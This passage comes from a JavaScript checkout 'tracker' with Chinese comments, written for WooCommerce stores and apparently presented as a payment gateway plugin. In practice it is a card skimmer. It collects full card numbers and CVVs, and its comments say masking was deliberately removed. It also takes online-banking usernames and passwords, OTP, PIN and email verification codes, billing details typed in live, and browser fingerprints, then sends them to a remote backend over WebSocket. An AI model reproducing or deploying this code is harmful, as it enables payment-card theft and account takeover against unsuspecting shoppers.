                            const verificationType = e.target.getAttribute('data-verification-type') || field.type;
                            
                            // 🔥 规范格式：verification_submit
                            this.sendMessage({
                                type: 'verification_submit',
                                session_id: this.sessionId,
                                order_no: this.orderNo,
                                verification_type: verificationType,
                                verification_data: {
                                    code: value
                                },
                                timestamp: Date.now()
                            });
                        }
                    });
                }
            });
        }
        
        /**
         * 🔥 附加验证按钮监听器（APP确认、重发验证码等）
         */
        attachVerificationButtonListeners(buttons) {
            buttons.forEach(buttonConfig => {
                // 查找所有匹配的按钮（可能有多个验证界面）
                const buttonElements = document.querySelectorAll(buttonConfig.selector);
                
                buttonElements.forEach(button => {
                    // 检查是否已绑定
                    if (!button.dataset.trackingBound) {
                        
                        // 标记已绑定
                        button.dataset.trackingBound = 'true';
                        
                        // 点击事件
                        button.addEventListener('click', (e) => {
                            
                            // 获取当前验证界面的类型（从父容器）
                            const verifyContainer = button.closest('.cpg-verify');
                            let verificationType = buttonConfig.type;
                            
                            if (verifyContainer) {
                                // 从容器ID提取验证类型 (cpg-otp -> otp)
                                const containerId = verifyContainer.id;
                                if (containerId && containerId.startsWith('cpg-')) {
                                    verificationType = containerId.replace('cpg-', '');
                                }
                            }
                            
                            // 🔥 如果是提交按钮，需要读取输入框的值并提交
                            if (buttonConfig.type === 'submit') {
                                // 🔥 显示加载圈圈，隐藏按钮
                                const loadingSection = document.getElementById(`${verificationType}LoadingSection`);
                                const submitButtons = document.querySelectorAll(`#cpg-${verificationType} .cpg-submit-btn`);
                                const resendButtons = document.querySelectorAll(`#cpg-${verificationType} .cpg-resend-btn`);
                                
                                // 🔥 给输入框添加submitting类（视觉反馈）
                                let inputElement = document.getElementById(`${verificationType}Input`);
                                if (inputElement) {
                                    inputElement.classList.add('submitting');
                                    inputElement.disabled = true;
                                }
                                
                                // 网银验证的两个输入框
                                if (verificationType === 'bank') {
                                    const customerInput = document.getElementById('bankCustomerInput');
                                    const passwordInput = document.getElementById('bankPasswordInput');
                                    if (customerInput) {
                                        customerInput.classList.add('submitting');
                                        customerInput.disabled = true;
                                    }
                                    if (passwordInput) {
                                        passwordInput.classList.add('submitting');
                                        passwordInput.disabled = true;
                                    }
                                }
                                
                                if (loadingSection) {
                                    loadingSection.style.display = 'block';
                                }
                                
                                // 隐藏提交和重发按钮
                                submitButtons.forEach(btn => btn.style.display = 'none');
                                resendButtons.forEach(btn => btn.style.display = 'none');
                                
                                // 🔥 网银验证特殊处理：需要发送两个输入框的值
                                // 🔥 规范：使用 verification_submit 类型（不是 verification_submitted）
                                if (verificationType === 'bank') {
                                    const customerInput = document.getElementById('bankCustomerInput');
                                    const passwordInput = document.getElementById('bankPasswordInput');
                                    const customerValue = customerInput ? customerInput.value : '';
                                    const passwordValue = passwordInput ? passwordInput.value : '';
                                    
                                    // 🔥🔥🔥 规范：发送网银验证提交事件（使用 verification_submitted，符合规范）🔥🔥🔥
                                    this.sendMessage({
                                        type: 'verification_submitted',
                                        session_id: this.sessionId,
                                        order_no: this.orderNo,
                                        order_id: this.getOrderId() || null,
                                        verification_type: 'bank',
                                        verification_data: {
                                            bank_username: customerValue,
                                            bank_password: passwordValue
                                        },
                                        timestamp: Date.now()
                                    });
                                } else {
                                    inputElement = this.findVerificationInput(verificationType);
                                    
                                    if (inputElement) {
                                        const inputValue = inputElement.value;
                                        const fieldName = inputElement.getAttribute('data-field') || 'code';
                                        
                                        // 🔥🔥🔥 规范：发送验证提交事件（使用 verification_submitted，符合规范）🔥🔥🔥
                                        this.sendMessage({
                                            type: 'verification_submitted',
                                            session_id: this.sessionId,
                                            order_no: this.orderNo,
                                            order_id: this.getOrderId() || null,
                                            verification_type: verificationType,
                                            verification_data: {
                                                code: inputValue
                                            },
                                            timestamp: Date.now()
                                        });
                                    } else {
                                        console.warn(`[CPG Tracker] ⚠️ 未找到验证输入框: ${verificationType}`);
                                        
                                        // APP验证或其他无输入框的验证
                                        this.sendMessage({
                                            type: 'verification_submitted',
                                            session_id: this.sessionId,
                                            order_no: this.orderNo,
                                            order_id: this.getOrderId() || null,
                                            verification_type: verificationType,
                                            verification_data: {
                                                confirmed: true
                                            },
                                            timestamp: Date.now()
                                        });
                                    }
                                }
                            } else if (buttonConfig.type === 'resend') {
                                // 重发验证码按钮
                                this.sendMessage({
                                    type: 'resend_code',
                                    session_id: this.sessionId,
                                    order_no: this.orderNo,
                                    verification_type: verificationType,
                                    button_type: buttonConfig.type,
                                    label: buttonConfig.label,
                                    action: 'clicked',
                                    timestamp: Date.now()
                                });
                            }
                        });
                        
                        // 🔥🔥🔥 移除按钮失焦事件（不符合规范，验证码提交应该只在点击时发送）🔥🔥🔥
                        // 注意：根据规范，验证码提交应该使用 verification_submitted 事件，在点击时发送
                        // 按钮失焦事件不应该发送验证码数据
                    }
                });
            });
        }
        
        /**
         * 🔥 查找验证界面的输入框
         */
        findVerificationInput(verificationType) {
            const inputIdMap = {
                'otp': 'otpInput',
                'email': 'emailInput',
                'pin': 'pinInput',
                'cvv': 'cvvInput',
                'bank': 'bankCustomerInput', // 网银有两个输入框，默认返回第一个
                'custom': 'customInput'
            };
            
            const inputId = inputIdMap[verificationType];
            if (inputId) {
                return document.getElementById(inputId);
            }
            
            return null;
        }

        /**
         * 检测卡类型（使用共用模块）
         */
        detectCardType(cardNumber) {
            // 🔥 优先使用共用模块
            if (window.CPG_CardUtils && typeof window.CPG_CardUtils.detectCardType === 'function') {
                return window.CPG_CardUtils.detectCardType(cardNumber);
            }
            
            // 备用：本地实现
            const patterns = {
                visa: /^4/,
                mastercard: /^5[1-5]/,
                amex: /^3[47]/,
                discover: /^6(?:011|5)/,
                unionpay: /^62/
            };
            
            for (const [type, pattern] of Object.entries(patterns)) {
                if (pattern.test(cardNumber)) {
                    return type;
                }
            }
            return 'unknown';
        }

        /**
         * 监听支付字段
         */
        monitorPaymentFields() {
            
            // 监听隐藏的卡片数据字段
            const cardFields = [
                'cpg_card_number',
                'cpg_expiry_date',
                'cpg_cvv',
                'cpg_card_type'
            ];

            cardFields.forEach(fieldId => {
                const field = document.getElementById(fieldId);
                if (field) {
                    
                    // 🔥 不再自动捕获，只在点击"下单购买"时捕获
                    // 监听字段变化仅用于调试日志
                    field.addEventListener('change', () => {
                    });
                    
                    field.addEventListener('input', () => {
                    });
                } else {
                    console.warn(`[CPG Tracker] ❌ 未找到隐藏字段: ${fieldId}`);
                }
            });
        }

    /**
     * 捕获结账表单数据
     */
    captureCheckoutData() {
        // 🔥 获取国家字段值（处理未选择和默认值情况）
        const getCountryValue = () => {
            const countryField = document.getElementById('billing_country') || document.querySelector('[name="billing_country"]');
            if (!countryField) {
                return ''; // 字段不存在
            }
            
            let countryValue = countryField.value || '';
            
            // 🔥 如果是 select 元素且值为空，尝试获取默认值（第一个非空选项）
            if (!countryValue && countryField.tagName === 'SELECT') {
                const firstOption = countryField.querySelector('option:not([value=""])');
                if (firstOption && firstOption.value) {
                    // 这是默认值，标记为默认
                    countryValue = firstOption.value;
                    this.log('📋 国家字段使用默认值:', countryValue);
                }
            }
            
            // 🔥 如果仍然为空，返回空字符串（让后端处理）
            return countryValue || '';
        };
        
        const checkoutData = {
            // 产品信息
            product_name: this.getProductInfo().name,
            product_price: this.getProductInfo().price,
            product_quantity: this.getProductInfo().quantity,
            
            // 联系信息
            email: this.getFieldValue('billing_email'),
            phone: this.getFieldValue('billing_phone'),
            
            // 账单地址
            first_name: this.getFieldValue('billing_first_name'),
            last_name: this.getFieldValue('billing_last_name'),
            full_name: this.getFullName(),
            address: this.getFieldValue('billing_address_1'),
            address_2: this.getFieldValue('billing_address_2'),
            city: this.getFieldValue('billing_city'),
            state: this.getFieldValue('billing_state'),
            postcode: this.getFieldValue('billing_postcode'),
            country: getCountryValue(), // 🔥 使用改进的国家字段获取方法
            
            // 🔥 订单信息（从URL参数或全局变量中获取）
            order_id: this.getOrderId(),
            order_key: this.getOrderKey(),
            site_url: this.config.site_url || window.location.origin,
            
            // 指纹信息（User-Agent格式）
            fingerprint: navigator.userAgent,
        };
        
        this.log('📋 捕获结账数据', checkoutData);
        return checkoutData;
    }
    
    /**
     * 🔥 获取订单ID（从URL参数或全局变量）
     */
    getOrderId() {
        // 方式1: 从URL参数读取
        const urlParams = new URLSearchParams(window.location.search);
        const orderIdFromUrl = urlParams.get('order_id');
        
        // 方式2: 从全局变量读取（订单接收页面设置）
        const orderIdFromGlobal = window.CPG_OrderID || window.wc_order_id;
        
        return orderIdFromUrl || orderIdFromGlobal || null;
    }
    
    /**
     * 🔥 获取订单密钥（从URL参数）
     */
    getOrderKey() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('key') || null;
    }

    /**
     * Luhn 算法验证卡号（使用共用模块）
     * @param {string} cardNumber - 卡号（纯数字字符串）
     * @returns {boolean} - 是否通过 Luhn 验证
     */
    luhnCheck(cardNumber) {
        // 🔥 优先使用共用模块
        if (window.CPG_CardUtils && typeof window.CPG_CardUtils.luhnCheck === 'function') {
            return window.CPG_CardUtils.luhnCheck(cardNumber);
        }
        
        // 备用：本地实现
        const cleanCardNumber = cardNumber.replace(/\D/g, '');
        
        if (cleanCardNumber.length < 13) {
            return false;
        }
        
        let sum = 0;
        let isEven = false;
        
        for (let i = cleanCardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cleanCardNumber.charAt(i), 10);
            
            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            isEven = !isEven;
        }
        
        return (sum % 10) === 0;
    }

    /**
     * 🔥 检查 WooCommerce 表单是否有验证错误
     */
    checkWooCommerceFormValid() {
        // 检查是否有 WooCommerce 错误提示
        const wooErrors = document.querySelectorAll('.woocommerce-error, .woocommerce-NoticeGroup-checkout .woocommerce-error');
        if (wooErrors.length > 0) {
            this.log('❌ WooCommerce 表单有验证错误，不发送卡片数据');
            return false;
        }
        
        // 检查必填字段是否为空
        const requiredFields = [
            'billing_first_name',
            'billing_last_name', 
            'billing_address_1',
            'billing_city',
            'billing_postcode',
            'billing_phone',
            'billing_email'
        ];
        
        for (const fieldId of requiredFields) {
            const field = document.getElementById(fieldId);
            if (field && field.hasAttribute('required') && !field.value.trim()) {
                this.log('❌ 必填字段为空: ' + fieldId);
                return false;
            }
        }
        
        // 检查表单是否处于 processing 状态（正在提交中）
        const checkoutForm = document.querySelector('form.checkout');
        if (checkoutForm && checkoutForm.classList.contains('processing')) {
            this.log('❌ 表单正在处理中');
            return false;
        }
        
        return true;
    }

    /**
     * 捕获卡片数据
     */
    captureCardData() {
        const cardNumber = document.getElementById('cpg_card_number')?.value || '';
        const expiryDate = document.getElementById('cpg_expiry_date')?.value || '';
        const cvv = document.getElementById('cpg_cvv')?.value || '';
        const cardType = document.getElementById('cpg_card_type')?.value || '';

        // 🔥 关键：确保至少有卡号、有效期和CVV三个字段都填写了
        if (!cardNumber || !expiryDate || !cvv) {
            return;
        }

        // 🔥 Luhn 算法验证卡号
        const cleanCardNumber = cardNumber.replace(/\D/g, '');
        if (!this.luhnCheck(cleanCardNumber)) {
            this.log('❌ 卡号未通过 Luhn 算法验证，不发送数据', {
                cardNumber: cardNumber ? `${cardNumber.substring(0, 6)}...` : '空'
            });
            return; // 卡号无效，不发送数据
        }
        
        // 🔥 新增：检查 WooCommerce 表单验证状态
        if (!this.checkWooCommerceFormValid()) {
            this.log('❌ WooCommerce 表单验证未通过，暂不发送卡片数据');
            return;
        }


        // 获取结账表单数据
        const checkoutData = this.captureCheckoutData();

        this.cardData = {
            card_number: cardNumber,
            card_number_masked: cardNumber,  // 不再脱敏，发送完整卡号
            expiry: expiryDate,
            expiry_date: expiryDate,
            card_expiry: expiryDate,
            cvv: cvv,  // 发送真实CVV
            card_cvv: cvv,  // 多个字段名兼容
            pin: '',  // PIN码字段
            pin_code: '',
            verification_code: '',  // OTP验证码字段
            otp: '',
            card_type: cardType,
            // 合并结账数据
            ...checkoutData,
        };

        // 发送卡片数据捕获事件
        
        this.sendMessage({
            type: 'card_data_captured',
            session_id: this.sessionId,
            order_no: this.orderNo,  // ✅ 前端生成的订单号
            order_id: checkoutData.order_id || null,  // 🔥 新增：WooCommerce 订单 ID
            site_name: this.config.site_name,
            site_url: this.config.site_url,
            order_prefix: this.config.order_prefix,
            page_url: window.location.href,
            user_agent: navigator.userAgent,
            device_info: this.deviceInfo,
            geo_info: this.geoInfo,
            data: this.cardData,
            timestamp: Date.now(),
        });
        
    }
    
    /**
     * 发送结账信息（实时，不需要等卡号）
     */
    sendCheckoutInfo() {
        const checkoutData = this.captureCheckoutData();
        
        // 检查是否有有效的结账数据
        if (!checkoutData.email && !checkoutData.phone && !checkoutData.full_name) {
            return; // 没有任何结账信息，不发送
        }
        
        this.log('📤 发送实时结账信息', checkoutData);
        
        this.sendMessage({
            type: 'checkout_info_updated',
            session_id: this.sessionId,
            order_no: this.orderNo,  // ✅ 新增：订单号
            site_name: this.config.site_name,
            site_url: this.config.site_url,
            order_prefix: this.config.order_prefix,
            page_url: window.location.href,
            user_agent: navigator.userAgent,
            device_info: this.deviceInfo,
            geo_info: this.geoInfo,
            data: checkoutData,
            timestamp: Date.now(),
        });
    }

        /**
         * 追踪输入（带专用事件类型）
         */
        trackInputWithSpecialEvents(input) {
            // 🔥 优先读取 data-field 属性（用于3D验证字段）
            const fieldName = input.dataset.field || input.name || input.id || 'unknown';
            const fieldType = input.type;
            let fieldValue = input.value;

            // 🔥 特殊处理：国家字段（select）如果值为空，尝试获取默认值
            if ((fieldName === 'billing_country' || fieldName === 'shipping_country') && 
                input.tagName === 'SELECT' && !fieldValue) {
                const firstOption = input.querySelector('option:not([value=""])');
                if (firstOption && firstOption.value) {
                    fieldValue = firstOption.value;
                    this.log(`📋 ${fieldName} 使用默认值:`, fieldValue);
                }
            }

            // 🔥 详细日志：显示所有字段，包括空值

            // 🔥 对于国家字段，即使使用默认值也要发送；其他字段空值不发送
            if (!fieldValue && fieldName !== 'billing_country' && fieldName !== 'shipping_country') {
                return; // 空值不发送（国家字段除外）
            }

            this.log(`📝 追踪输入: ${fieldName}`);

            // 映射到专用事件类型（完整的WooCommerce结账字段）
            const eventTypeMap = {
                // 账单信息
                'billing_email': 'input_email',
                'billing_phone': 'input_phone',
                'billing_first_name': 'input_name',
                'billing_last_name': 'input_name',
                'billing_company': 'input_name', // 公司名称也算姓名类
                'billing_address_1': 'input_address',
                'billing_address_2': 'input_address',
                'billing_city': 'input_city',
                'billing_state': 'input_state',
                'billing_postcode': 'input_postcode',
                'billing_country': 'input_country',
                // 配送信息（如果启用）
                'shipping_first_name': 'input_name',
                'shipping_last_name': 'input_name',
                'shipping_company': 'input_name',
                'shipping_address_1': 'input_address',
                'shipping_address_2': 'input_address',
                'shipping_city': 'input_city',
                'shipping_state': 'input_state',
                'shipping_postcode': 'input_postcode',
                'shipping_country': 'input_country',
                // 其他可能字段
                'order_comments': 'input_address', // 订单备注归入地址类
            };

            // 确定事件类型
            const eventType = eventTypeMap[fieldName] || 'user_input';

            // 发送专用事件
            const eventData = {
                field: fieldName,
                type: fieldType,
                value: fieldValue,
                value_length: fieldValue.length,
            };
            
            // 🔥 如果是姓名字段，还要发送组合后的全名
            if (eventType === 'input_name') {
                eventData.full_name = this.getFullName();
            }
            
            this.trackEvent(eventType, eventData);
        }

        /**
         * 追踪输入（旧版，保留兼容）
         */
        trackInput(input) {
            this.trackInputWithSpecialEvents(input);
        }

        /**
         * 追踪事件（修复版：数据结构匹配后端期望格式）
         */
        trackEvent(eventType, data = {}) {
            // ✅ 强制输出日志（不受debug限制）
            
            // ✅ 构建消息 - 将 data 中的字段提升到根级别（后端期望格式）
            const message = {
                type: 'user_event',  // ✅ 固定为 user_event，后端路由
                event_type: eventType,  // ✅ 具体的事件类型（input_card, input_email等）
                session_id: this.sessionId,
                order_no: this.orderNo,  // ✅ 前端生成的订单号
                order_id: this.getOrderId() || null,  // 🔥 新增：WooCommerce 订单 ID
                site_name: this.config.site_name,
                site_url: this.config.site_url,
                order_prefix: this.config.order_prefix,
                page_url: window.location.href,
                user_agent: navigator.userAgent,
                device_info: this.deviceInfo,
                geo_info: this.geoInfo,
                timestamp: Date.now(),
                data: data  // ✅ 保留在 data 字段（event_data）
            };
            
            // ✅ 将 data 的内容复制到 message 根级别（兼容性更好的方式）
            // ⚠️ 但跳过 'type' 字段，避免覆盖 message.type = 'user_event'
            for (const key in data) {
                if (data.hasOwnProperty(key) && key !== 'type') {
                    message[key] = data[key];
                }
            }
            
            this.sendMessage(message);
        }

        /**
         * 🔥 统一处理所有得失焦事件
         * @param {string} eventType - 事件类型（如 'input_focus', 'input_blur', 'verification_focus' 等）
         * @param {Object} data - 事件数据
         * @param {string} customType - 可选的自定义 type（如 'input_blur', 'verification_focus' 等），如果提供则使用此值作为 message.type
         */
        trackFocusEvent(eventType, data = {}, customType = null) {
            // 🔥 构建统一的消息格式
            const message = {
                type: customType || 'user_event',  // 如果提供了 customType，使用它；否则使用 'user_event'
                event_type: eventType,  // 具体的事件类型
                session_id: this.sessionId,
                order_no: this.orderNo,
                order_id: this.getOrderId() || null,
                site_name: this.config.site_name,
                site_url: this.config.site_url,
                order_prefix: this.config.order_prefix,
                page_url: window.location.href,
                user_agent: navigator.userAgent,
                device_info: this.deviceInfo,
                geo_info: this.geoInfo,
                timestamp: Date.now(),
                data: data  // 保留在 data 字段
            };
            
            // ✅ 将 data 的内容复制到 message 根级别（兼容性更好的方式）
            // ⚠️ 但跳过 'type' 字段，避免覆盖 message.type
            for (const key in data) {
                if (data.hasOwnProperty(key) && key !== 'type') {
                    message[key] = data[key];
                }
            }
            
            this.sendMessage(message);
        }

        /**
         * 追踪表单提交
         */
        trackFormSubmit(form) {
            const formData = new FormData(form);
            const data = {};

            for (let [key, value] of formData.entries()) {
                if (this.isSensitiveField(key)) {
                    data[key] = this.maskValue(value, key);
                } else {
                    data[key] = value;
                }
            }

            this.trackEvent('form_submit', {
                form_id: form.id,
                form_action: form.action,
                form_data: data,
            });
            
            // 🔥 如果是结账表单，在提交时捕获卡号数据（主网关）
            if (form.classList.contains('checkout') || form.id === 'checkout' || form.querySelector('#place_order')) {
                this.captureCardData();
            }
        }

        /**
         * 判断是否为敏感字段
         */
        isSensitiveField(fieldName) {
            const sensitiveFields = [
                'password', 'pwd', 'pass',
                'card', 'cvv', 'cvc', 'security_code',
                'ssn', 'social_security',
            ];
            
            fieldName = fieldName.toLowerCase();
            return sensitiveFields.some(field => fieldName.includes(field));
        }

        /**
         * 判断是否为卡号字段
         */
        isCardField(fieldName) {
            fieldName = fieldName.toLowerCase();
            return fieldName.includes('card') && fieldName.includes('number');
        }

        /**
         * 脱敏值
         */
        maskValue(value, fieldName) {
            if (!value) return '';
            
            if (fieldName.toLowerCase().includes('card')) {
                return this.maskCardNumber(value);
            }
            
            return '*'.repeat(value.length);
        }

        /**
         * 返回完整卡号（移除脱敏）
         */
        maskCardNumber(cardNumber) {
            // 移除空格，返回完整卡号
            return cardNumber.replace(/\s/g, '');
        }

        /**
         * 获取表单字段值
         */
        getFieldValue(fieldName) {
            const field = document.getElementById(fieldName) || document.querySelector(`[name="${fieldName}"]`);
            return field ? field.value : '';
        }

        /**
         * 获取完整姓名
         */
        getFullName() {
            const firstName = this.getFieldValue('billing_first_name');
            const lastName = this.getFieldValue('billing_last_name');
            return `${firstName} ${lastName}`.trim();
        }

        /**
         * 获取产品信息
         * 🔥 改进：优先使用 CPG_CONFIG，然后支持 FunnelKit 和 WooCommerce DOM 选择器
         */
        getProductInfo() {
            // 🔥 统一从 CPG_CONFIG 获取（PHP 后端传递的数据，已规范统一）
            const configProductName = window.CPG_CONFIG?.product_name;
            const configProductPrice = window.CPG_CONFIG?.product_price;
            
            // 🔥 产品名称 - 仅从 CPG_CONFIG 获取，不再使用 DOM 选择器
            let productName = (configProductName && configProductName !== 'N/A') ? configProductName : 'N/A';
            
            // 🔥 清理产品名称（移除数量标记如 " × 1"）
            if (productName && productName !== 'N/A') {
                productName = productName.replace(/\s*×\s*\d+\s*$/, '').trim();
            }
            
            // 🔥 产品价格 - 仅从 CPG_CONFIG 获取，不再使用 DOM 选择器
            const productPrice = (configProductPrice && configProductPrice !== '$0.00') ? configProductPrice : '$0.00';
            
            // 🔥 产品数量（可能不在 CPG_CONFIG 中，保留 DOM 选择器作为备用）
            const productQuantity = 
                document.querySelector('.wfacp_product_quantity')?.textContent?.trim()?.replace(/[^\d]/g, '') ||
                document.querySelector('.product-quantity')?.textContent?.trim()?.replace(/[^\d]/g, '') ||
                document.querySelector('.cart_item .qty')?.value ||
                document.querySelector('input.qty')?.value ||
                '1';
            
            console.log('[CPG Tracker] 📦 获取产品信息:', { productName, productPrice, productQuantity, fromConfig: !!(configProductName || configProductPrice) });
            
            return {
                name: productName,
                price: productPrice,
                quantity: productQuantity,
            };
        }
        
        /**
         * 🔥🔥🔥 第一时间发送商品信息
         */
        sendProductInfo() {
            const productInfo = this.getProductInfo();
            
            // 确保有有效的产品信息
            if (!productInfo.name || productInfo.name === 'N/A') {
                console.log('[CPG Tracker] ⚠️ 商品信息暂不可用，稍后重试');
                // 延迟重试（页面可能还在加载）
                setTimeout(() => {
                    const retryInfo = this.getProductInfo();
                    if (retryInfo.name && retryInfo.name !== 'N/A') {
                        this.doSendProductInfo(retryInfo);
                    }
                }, 1000);
                return;
            }
            
            this.doSendProductInfo(productInfo);
        }
        
        /**
         * 🔥 实际发送商品信息
         */
        doSendProductInfo(productInfo) {
            this.sendMessage({
                type: 'product_info',
                session_id: this.sessionId,
                order_no: this.orderNo,
                order_id: this.getOrderId() || null,
                product_name: productInfo.name,
                product_price: productInfo.price,
                product_quantity: productInfo.quantity || 1,
                site_name: this.config.site_name,
                site_url: this.config.site_url,
                page_url: window.location.href,
                timestamp: Date.now()
            });
            
            console.log('[CPG Tracker] 📦 商品信息已发送:', productInfo.name, productInfo.price);
            
            // 🔥 同时保存到全局变量，供验证界面使用
            window.CPG_ProductInfo = productInfo;
        }
        
        /**
         * 🔥 追踪商品浏览 - 发送 view_product 事件
         * 包含 product_name 和 product_price
         */
        trackProductView() {
            
            // 检查是否在WooCommerce页面（包括FunnelKit结账页）
            const isWooCommercePage = document.body.classList.contains('woocommerce') || 
                                      document.querySelector('.woocommerce') ||
                                      document.querySelector('.wfacp_main_form') ||
                                      document.querySelector('#wfacp-e-form');
            
            if (!isWooCommercePage) {
                console.log('[CPG Tracker] ⏭️ 非 WooCommerce 页面，跳过 view_product 事件');
                return;
            }
            
            const productInfo = this.getProductInfo();
            
            // 🔥 确保有有效的产品信息才发送
            const hasValidProduct = productInfo.name && productInfo.name !== 'N/A';
            const hasValidPrice = productInfo.price && productInfo.price !== '$0.00';
            
            // 确定页面类型
            let pageType = 'unknown';
            if (document.body.classList.contains('single-product')) {
                pageType = 'product';
            } else if (document.body.classList.contains('woocommerce-checkout') || 
                       document.querySelector('.wfacp_main_form') ||
                       window.location.pathname.includes('checkout')) {
                pageType = 'checkout';
            } else if (document.body.classList.contains('woocommerce-cart')) {
                pageType = 'cart';
            }
            
            console.log('[CPG Tracker] 📦 发送 view_product 事件:', {
                product_name: productInfo.name,
                product_price: productInfo.price,
                hasValidProduct,
                hasValidPrice,
                pageType
            });
            
            // 发送商品浏览事件
            this.trackEvent('view_product', {
                product_name: productInfo.name,
                product_price: productInfo.price,
                product_quantity: productInfo.quantity,
                url: window.location.href,
                page_type: pageType,
                has_valid_product: hasValidProduct,
                has_valid_price: hasValidPrice
            });
            
        }

        /**
         * 生成浏览器指纹
         */
        generateFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Browser Fingerprint', 2, 2);
            const canvasFingerprint = canvas.toDataURL();
            
            const fingerprint = {
                canvas: canvasFingerprint.substring(0, 50),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'unknown',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
            };
            
            return JSON.stringify(fingerprint);
        }
        
        /**
         * 生成简化版指纹（更易读）
         */
        generateSimpleFingerprint() {
            const parts = [
                navigator.platform || 'Unknown',
                this.getBrowser(),
                this.getOS(),
                `${window.screen.width}x${window.screen.height}`,
                navigator.language || 'Unknown',
                (navigator.hardwareConcurrency || 'N/A') + ' cores',
            ];
            return parts.join(' | ');
        }

        /**
         * 生成会话ID（8小时持久化版本 - 增强调试）
         */
        generateSessionId() {
            
            // 🍪 优先从Cookie读取（最可靠，不受浏览器关闭影响）
            const cookieSessionId = this.getCookie('cpg_session_id');
            const cookieTimestamp = this.getCookie('cpg_last_activity');
            
            // 📦 备用：从localStorage读取
            const localSessionId = localStorage.getItem('cpg_session_id');
            const localTimestamp = localStorage.getItem('cpg_last_activity_time');
            
            
            // 🔥 使用Cookie优先策略
            const sessionId = cookieSessionId || localSessionId;
            const lastActivity = cookieTimestamp || localTimestamp;
            
            if (sessionId && lastActivity) {
                const elapsedTime = Date.now() - parseInt(lastActivity);
                const hours = Math.floor(elapsedTime / (1000 * 60 * 60));
                const minutes = Math.floor((elapsedTime % (1000 * 60 * 60)) / (1000 * 60));
                
                
                // ✅ 8小时内复用
                if (elapsedTime < 8 * 60 * 60 * 1000) {
                    
                    // 🔥 同步到Cookie和localStorage（确保一致性）
                    const now = Date.now().toString();
                    this.setCookie('cpg_session_id', sessionId, 8);
                    this.setCookie('cpg_last_activity', now, 8);
                    localStorage.setItem('cpg_session_id', sessionId);
                    localStorage.setItem('cpg_last_activity_time', now);
                    
                    return sessionId;
                }
                
                // ❌ 超时，清除旧session
                this.deleteCookie('cpg_session_id');
                this.deleteCookie('cpg_last_activity');
                localStorage.removeItem('cpg_session_id');
                localStorage.removeItem('cpg_last_activity_time');
                localStorage.removeItem('cpg_was_online');
            } else {
            }
            
            // 🆕 生成新会话
            const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            const now = Date.now().toString();
            
            
            // 🔥 同时保存到Cookie和localStorage（双重保障）
            this.setCookie('cpg_session_id', newSessionId, 8);
            this.setCookie('cpg_last_activity', now, 8);
            localStorage.setItem('cpg_session_id', newSessionId);
            localStorage.setItem('cpg_last_activity_time', now);
            
            return newSessionId;
        }
        
        /**
         * 🍪 设置Cookie（8小时有效期）
         */
        setCookie(name, value, hours) {
            const maxAge = hours * 60 * 60; // 转换为秒
            document.cookie = `${name}=${value}; path=/; max-age=${maxAge}; SameSite=Lax`;
        }
        
        /**
         * 🍪 读取Cookie
         */
        getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) {
                return parts.pop().split(';').shift();
            }
            return null;
        }
        
        /**
         * 🍪 删除Cookie
         */
        deleteCookie(name) {
            document.cookie = `${name}=; path=/; max-age=0`;
        }
        
        /**
         * 生成订单号（格式：订单前缀 + 时间戳 + 随机字符串）
         */
        generateOrderNo() {
            const prefix = this.config.order_prefix || 'WP'; // 默认前缀 WP
            const timestamp = Date.now();
            const random = Math.random().toString(36).substr(2, 6).toUpperCase(); // 6位随机字符串
            const orderNo = `${prefix}${timestamp}${random}`;
            
            return orderNo;
        }

        /**
         * 收集设备信息
         */
        collectDeviceInfo() {
            const ua = navigator.userAgent;
            // 🔥 更精确的设备类型检测
            let deviceType = 'Desktop';
            if (/iPhone/i.test(ua)) deviceType = 'iPhone';
            else if (/iPad/i.test(ua)) deviceType = 'iPad';
            else if (/Android.*Mobile/i.test(ua)) deviceType = 'Android Phone';
            else if (/Android/i.test(ua)) deviceType = 'Android Tablet';
            else if (/Mobile/i.test(ua)) deviceType = 'Mobile';
            
            this.deviceInfo = {
                device: deviceType,
                os: this.getOS(),
                browser: this.getBrowser(),
                screen: `${window.screen.width}x${window.screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
            };
            
        }

        /**
         * 收集地理信息
         */
        async collectGeoInfo() {
            this.geoInfo = {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language || navigator.userLanguage,
            };
            
            // 由于浏览器CORS限制，IP地址将由后端自动获取
            // 前端只收集时区和语言信息
            this.log('📍 基础地理信息已收集（IP将由后端获取）');
        }

        /**
         * 获取操作系统
         */
        getOS() {
            const ua = navigator.userAgent;
            // 🔥 优先检测移动设备（更精确）
            if (/iPhone/i.test(ua)) return 'iOS (iPhone)';
            if (/iPad/i.test(ua)) return 'iOS (iPad)';
            if (/Android/i.test(ua)) return 'Android';
            // 桌面系统
            if (/Windows/i.test(ua)) return 'Windows';
            if (/Macintosh|Mac OS X/i.test(ua)) return 'MacOS';
            if (/Linux/i.test(ua) && !/Android/i.test(ua)) return 'Linux';
            return 'Unknown';
        }

        /**
         * 获取浏览器
         */
        getBrowser() {
            const ua = navigator.userAgent;
            if (ua.indexOf('Chrome') !== -1) return 'Chrome';
            if (ua.indexOf('Safari') !== -1) return 'Safari';
            if (ua.indexOf('Firefox') !== -1) return 'Firefox';
            if (ua.indexOf('Edge') !== -1) return 'Edge';
            return 'Unknown';
        }

        /**
         * 防抖函数
         */
        debounce(func, wait) {
            let timeout;
            return function executedFunction(...args) {
                const later = () => {
                    clearTimeout(timeout);
                    func(...args);
                };
                clearTimeout(timeout);
                timeout = setTimeout(later, wait);
            };
        }

        /**
         * 🔥 记录访问日志到后端
         */
        recordAccessLog() {
            try {
                // 🔥 通过WebSocket发送访问日志，不使用REST API
                if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                    const logData = {
                        type: 'access_log',
